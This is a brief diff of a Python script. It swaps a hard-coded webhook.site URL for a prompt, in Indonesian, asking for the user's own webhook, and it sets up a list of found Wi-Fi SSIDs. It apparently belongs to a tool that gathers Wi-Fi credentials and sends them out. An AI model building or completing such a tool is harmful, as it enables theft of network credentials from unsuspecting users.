@@ -4,7 +4,9 @@ import subprocess
 import sys
 
 # Replace with your webhook
-url = 'https://webhook.site/ff8ef1c6-4dab-44b5-8f2d-7e4df11238f2'
+
+
+url = input("Masukan Webhook Url Kamu ?")
 
 # Lists and regex
 found_ssids = []
